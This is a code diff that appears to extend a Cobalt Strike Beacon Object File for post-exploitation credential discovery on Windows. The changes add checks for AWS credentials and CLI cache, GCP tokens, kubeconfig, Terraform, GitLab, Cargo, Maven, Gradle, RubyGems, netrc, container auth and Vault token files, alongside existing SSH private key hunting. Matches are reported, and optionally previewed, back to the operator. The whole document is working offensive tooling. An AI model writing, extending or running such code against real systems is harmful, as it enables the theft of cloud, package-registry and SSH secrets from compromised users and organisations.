@@ -78,6 +78,9 @@ typedef unsigned short wchar_t;
 #define PREVIEW_LINE_MAX 128
 #define SSH_HEADER_READ_MAX 192
 #define MAX_PEM_HITS 8
+#define MAX_CACHE_HITS 8
+#define ARTIFACT_CREDENTIAL 0
+#define ARTIFACT_CONFIG 1
 
 typedef struct {
     int verbose;
@@ -114,8 +117,8 @@ typedef struct {
 } WIN32_FIND_DATAW;
 
 typedef struct {
-    int fixed_hits;
-    int ssh_config_hits;
+    int credential_hits;
+    int config_hits;
     int ssh_key_hits;
     int previewed_files;
     int preview_errors;
@@ -124,10 +127,10 @@ typedef struct {
 } scan_results_t;
 
 typedef struct {
-    wchar_t ssh_root[MAX_PATH_LEN];
+    wchar_t root[MAX_PATH_LEN];
     wchar_t candidate[MAX_PATH_LEN];
     WIN32_FIND_DATAW find_data;
-} ssh_scratch_t;
+} path_enum_scratch_t;
 
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$ExpandEnvironmentStringsW(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileAttributesW(LPCWSTR lpFileName);
@@ -584,25 +587,93 @@ static void inspect_text_artifact(const wchar_t *label, const wchar_t *expanded_
     if (!path_exists(expanded_path) || is_directory_path(expanded_path)) {
         return;
     }
-    if (!get_file_size_low(expanded_path, &size_low, &size_high)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, expanded_path);
-        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: unavailable\n");
+    if (class_id == ARTIFACT_CONFIG) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[i] %S: %S\n", label, expanded_path);
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, expanded_path);
-        if (size_high != 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: >4GB\n");
-        } else {
-            BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: %lu bytes\n", (unsigned long)size_low);
-        }
+    }
+    if (!get_file_size_low(expanded_path, &size_low, &size_high)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: unavailable\n");
+    } else if (size_high != 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: >4GB\n");
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: %lu bytes\n", (unsigned long)size_low);
+    }
+    if (class_id == ARTIFACT_CONFIG) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Classification: configuration (not a credential artifact)\n");
     }
     if (verbose) {
         preview_text_file(label, expanded_path, size_low, results, highlight_gitconfig);
     }
-    if (class_id == 0) {
-        results->fixed_hits++;
-    } else if (class_id == 1) {
-        results->ssh_config_hits++;
+    if (class_id == ARTIFACT_CREDENTIAL) {
+        results->credential_hits++;
+    } else if (class_id == ARTIFACT_CONFIG) {
+        results->config_hits++;
     }
+}
+
+static void inspect_env_text(const wchar_t *pattern, const wchar_t *label, wchar_t *path, size_t path_len, scan_results_t *results, int class_id, int highlight_gitconfig, int verbose) {
+    if (!pattern || !label || !path || path_len == 0) {
+        return;
+    }
+    inline_memset(path, 0, path_len * sizeof(wchar_t));
+    if (expand_env_path(pattern, path, path_len)) {
+        inspect_text_artifact(label, path, results, class_id, highlight_gitconfig, verbose);
+    }
+}
+
+static void inspect_cache_directory(const wchar_t *label, const wchar_t *dir_pattern, const wchar_t *file_glob, scan_results_t *results, int verbose) {
+    path_enum_scratch_t *scratch;
+    HANDLE hFind = INVALID_HANDLE_VALUE;
+    int hits = 0;
+    if (!label || !dir_pattern || !file_glob || !results) {
+        return;
+    }
+    scratch = (path_enum_scratch_t *)KERNEL32$VirtualAlloc(NULL, sizeof(path_enum_scratch_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!scratch) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] %S discovery unavailable: insufficient memory\n", label);
+        return;
+    }
+    inline_memset(scratch, 0, sizeof(path_enum_scratch_t));
+    if (!expand_env_path(dir_pattern, scratch->root, MAX_PATH_LEN)) {
+        goto cleanup;
+    }
+    if (!is_directory_path(scratch->root)) {
+        goto cleanup;
+    }
+    if (!append_component(scratch->root, file_glob, scratch->candidate, MAX_PATH_LEN)) {
+        goto cleanup;
+    }
+    hFind = KERNEL32$FindFirstFileW(scratch->candidate, &scratch->find_data);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, scratch->root);
+        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: directory (0 files)\n");
+        results->credential_hits++;
+        goto cleanup;
+    }
+    do {
+        if ((scratch->find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {
+            continue;
+        }
+        if (hits >= MAX_CACHE_HITS) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Additional %S files skipped after %d hits\n", label, MAX_CACHE_HITS);
+            break;
+        }
+        if (append_component(scratch->root, scratch->find_data.cFileName, scratch->candidate, MAX_PATH_LEN)) {
+            inspect_text_artifact(label, scratch->candidate, results, ARTIFACT_CREDENTIAL, 0, verbose);
+            hits++;
+        }
+    } while (KERNEL32$FindNextFileW(hFind, &scratch->find_data));
+    if (hits == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, scratch->root);
+        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: directory (0 files)\n");
+        results->credential_hits++;
+    }
+cleanup:
+    if (hFind != INVALID_HANDLE_VALUE) {
+        KERNEL32$FindClose(hFind);
+    }
+    secure_virtual_free(scratch, sizeof(path_enum_scratch_t));
 }
 
 static void inspect_private_key(const wchar_t *label, LPCWSTR path, scan_results_t *results, int verbose) {
@@ -662,63 +733,77 @@ static void inspect_fixed_patterns(scan_results_t *results, int verbose) {
     wchar_t *path;
     path = (wchar_t *)KERNEL32$VirtualAlloc(NULL, MAX_PATH_LEN * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!path) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[-] Fixed artifact discovery unavailable: insufficient memory\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Credential artifact discovery unavailable: insufficient memory\n");
         return;
     }
     inline_memset(path, 0, MAX_PATH_LEN * sizeof(wchar_t));
-    if (expand_env_path(L"%APPDATA%\\GitHub CLI\\hosts.yml", path, MAX_PATH_LEN)) {
-        inspect_text_artifact(L"GitHub CLI auth", path, results, 0, 0, verbose);
-    }
-    if (expand_env_path(L"%USERPROFILE%\\.npmrc", path, MAX_PATH_LEN)) {
-        inspect_text_artifact(L"npm config", path, results, 0, 0, verbose);
-    }
-    if (expand_env_path(L"%USERPROFILE%\\.pypirc", path, MAX_PATH_LEN)) {
-        inspect_text_artifact(L"PyPI config", path, results, 0, 0, verbose);
-    }
-    if (expand_env_path(L"%USERPROFILE%\\.docker\\config.json", path, MAX_PATH_LEN)) {
-        inspect_text_artifact(L"Docker config", path, results, 0, 0, verbose);
-    }
-    if (expand_env_path(L"%USERPROFILE%\\.git-credentials", path, MAX_PATH_LEN)) {
-        inspect_text_artifact(L"Git credential store", path, results, 0, 0, verbose);
-    }
-    if (expand_env_path(L"%USERPROFILE%\\.gitconfig", path, MAX_PATH_LEN)) {
-        inspect_text_artifact(L"Git config", path, results, 0, 1, verbose);
-    }
+
+    inspect_env_text(L"%USERPROFILE%\\.aws\\credentials", L"AWS credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.aws\\config", L"AWS config", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_cache_directory(L"AWS CLI cache", L"%USERPROFILE%\\.aws\\cli\\cache", L"*", results, verbose);
+    inspect_env_text(L"%APPDATA%\\gcloud\\application_default_credentials.json", L"GCP ADC", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.config\\gcloud\\application_default_credentials.json", L"GCP ADC", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+
+    inspect_env_text(L"%USERPROFILE%\\.kube\\config", L"Kubeconfig", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%APPDATA%\\terraform.d\\credentials.tfrc.json", L"Terraform credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.terraform.d\\credentials.tfrc.json", L"Terraform credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+
+    inspect_env_text(L"%APPDATA%\\GitHub CLI\\hosts.yml", L"GitHub CLI auth", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%APPDATA%\\glab-cli\\config.yml", L"GitLab CLI auth", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.config\\glab-cli\\config.yml", L"GitLab CLI auth", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+
+    inspect_env_text(L"%USERPROFILE%\\.npmrc", L"npm config", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.pypirc", L"PyPI config", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.docker\\config.json", L"Docker config", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.cargo\\credentials.toml", L"Cargo credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.cargo\\credentials", L"Cargo credentials (legacy)", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.m2\\settings.xml", L"Maven settings", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.gradle\\gradle.properties", L"Gradle properties", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.gem\\credentials", L"RubyGems credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+
+    inspect_env_text(L"%USERPROFILE%\\.git-credentials", L"Git credential store", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.gitconfig", L"Git config", path, MAX_PATH_LEN, results, ARTIFACT_CONFIG, 1, verbose);
+
+    inspect_env_text(L"%USERPROFILE%\\.netrc", L"Netrc", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\_netrc", L"Netrc (Windows)", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.config\\containers\\auth.json", L"Containers auth", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+    inspect_env_text(L"%USERPROFILE%\\.vault-token", L"Vault token", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
+
     secure_virtual_free(path, MAX_PATH_LEN * sizeof(wchar_t));
 }
 
 static void inspect_ssh_artifacts(scan_results_t *results, int verbose) {
-    ssh_scratch_t *scratch;
+    path_enum_scratch_t *scratch;
     HANDLE hFind = INVALID_HANDLE_VALUE;
     int pem_hits = 0;
-    scratch = (ssh_scratch_t *)KERNEL32$VirtualAlloc(NULL, sizeof(ssh_scratch_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    scratch = (path_enum_scratch_t *)KERNEL32$VirtualAlloc(NULL, sizeof(path_enum_scratch_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!scratch) {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] SSH artifact discovery unavailable: insufficient memory\n");
         return;
     }
-    inline_memset(scratch, 0, sizeof(ssh_scratch_t));
-    if (!expand_env_path(L"%USERPROFILE%\\.ssh", scratch->ssh_root, MAX_PATH_LEN)) {
+    inline_memset(scratch, 0, sizeof(path_enum_scratch_t));
+    if (!expand_env_path(L"%USERPROFILE%\\.ssh", scratch->root, MAX_PATH_LEN)) {
         goto cleanup;
     }
-    if (!is_directory_path(scratch->ssh_root)) {
+    if (!is_directory_path(scratch->root)) {
         goto cleanup;
     }
-    if (append_component(scratch->ssh_root, L"config", scratch->candidate, MAX_PATH_LEN)) {
-        inspect_text_artifact(L"SSH config", scratch->candidate, results, 1, 0, verbose);
+    if (append_component(scratch->root, L"config", scratch->candidate, MAX_PATH_LEN)) {
+        inspect_text_artifact(L"SSH config", scratch->candidate, results, ARTIFACT_CONFIG, 0, verbose);
     }
-    if (append_component(scratch->ssh_root, L"id_rsa", scratch->candidate, MAX_PATH_LEN)) {
+    if (append_component(scratch->root, L"id_rsa", scratch->candidate, MAX_PATH_LEN)) {
         inspect_private_key(L"SSH private key", scratch->candidate, results, verbose);
     }
-    if (append_component(scratch->ssh_root, L"id_ed25519", scratch->candidate, MAX_PATH_LEN)) {
+    if (append_component(scratch->root, L"id_ed25519", scratch->candidate, MAX_PATH_LEN)) {
         inspect_private_key(L"SSH private key", scratch->candidate, results, verbose);
     }
-    if (append_component(scratch->ssh_root, L"id_ecdsa", scratch->candidate, MAX_PATH_LEN)) {
+    if (append_component(scratch->root, L"id_ecdsa", scratch->candidate, MAX_PATH_LEN)) {
         inspect_private_key(L"SSH private key", scratch->candidate, results, verbose);
     }
-    if (append_component(scratch->ssh_root, L"identity", scratch->candidate, MAX_PATH_LEN)) {
+    if (append_component(scratch->root, L"identity", scratch->candidate, MAX_PATH_LEN)) {
         inspect_private_key(L"SSH private key", scratch->candidate, results, verbose);
     }
-    if (!append_component(scratch->ssh_root, L"*.pem", scratch->candidate, MAX_PATH_LEN)) {
+    if (!append_component(scratch->root, L"*.pem", scratch->candidate, MAX_PATH_LEN)) {
         goto cleanup;
     }
     hFind = KERNEL32$FindFirstFileW(scratch->candidate, &scratch->find_data);
@@ -736,7 +821,7 @@ static void inspect_ssh_artifacts(scan_results_t *results, int verbose) {
             BeaconPrintf(CALLBACK_OUTPUT, "[!] Additional .pem files skipped after %d hits\n", MAX_PEM_HITS);
             break;
         }
-        if (append_component(scratch->ssh_root, scratch->find_data.cFileName, scratch->candidate, MAX_PATH_LEN)) {
+        if (append_component(scratch->root, scratch->find_data.cFileName, scratch->candidate, MAX_PATH_LEN)) {
             inspect_private_key(L"SSH PEM candidate", scratch->candidate, results, verbose);
             pem_hits++;
         }
@@ -745,7 +830,7 @@ cleanup:
     if (hFind != INVALID_HANDLE_VALUE) {
         KERNEL32$FindClose(hFind);
     }
-    secure_virtual_free(scratch, sizeof(ssh_scratch_t));
+    secure_virtual_free(scratch, sizeof(path_enum_scratch_t));
 }
 
 void go(char *args, unsigned long alen) {
@@ -765,9 +850,9 @@ void go(char *args, unsigned long alen) {
     inspect_ssh_artifacts(&results, opts.verbose);
     BeaconPrintf(
         CALLBACK_OUTPUT,
-        "[i] Summary: fixed artifacts=%d, ssh configs=%d, ssh key candidates=%d, previews=%d, preview errors=%d, truncated previews=%d\n",
-        results.fixed_hits,
-        results.ssh_config_hits,
+        "[i] Summary: credential artifacts=%d, config artifacts=%d, ssh key candidates=%d, previews=%d, preview errors=%d, truncated previews=%d\n",
+        results.credential_hits,
+        results.config_hits,
         results.ssh_key_hits,
         results.previewed_files,
         results.preview_errors,
